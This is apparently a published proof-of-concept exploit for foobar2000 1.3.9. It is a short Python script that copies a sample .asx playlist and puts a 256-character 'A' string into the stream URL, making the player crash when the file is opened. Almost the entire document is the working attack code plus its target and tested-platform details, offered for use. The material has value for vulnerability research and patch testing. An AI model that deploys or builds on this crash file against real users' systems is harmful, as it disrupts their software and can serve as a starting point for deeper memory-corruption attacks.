# Exploit Title: foobar2000 1.3.9 (.asx) Local Crash PoC
# Date: 11-15-2015
# Exploit Author: Antonio Z.
# Vendor Homepage: http://www.foobar2000.org/
# Software Link: http://www.foobar2000.org/getfile/036be51abc909653ad44d664f0ce3668/foobar2000_v1.3.9.exe
# Version: 1.3.9
# Tested on: Windows XP SP3, Windows 7 SP1 x86, Windows 7 SP1 x64, Windows 8.1 x64, Windows 10 x64

# Instructions: Create playlist.asx:
# <asx version="3.0">
#   <title>Example.com Live Stream</title>
#
#   <entry>
#     <title>Short Announcement to Play Before Main Stream</title>
#     <ref href="http://example.com/announcement.wma" />
#     <param name="aParameterName" value="aParameterValue" />
#   </entry>
#
#   <entry>
#     <title>Example radio</title>
#     <ref href="http://example.com" />
#     <author>Example.com</author>
#     <copyright>example.com</copyright>
#   </entry>
# </asx>

import os
import shutil

evil = 'A' * 256

shutil.copy ('playlist.asx', 'Local_Crash_PoC.asx')

file = open('Local_Crash_PoC.asx','r')
file_data = file.read()
file.close()
file_new_data = file_data.replace('<ref href="http://example.com" />','<ref href="http://' + evil + '" />')
file = open('Local_Crash_PoC.asx','w')
file.write(file_new_data)
file.close()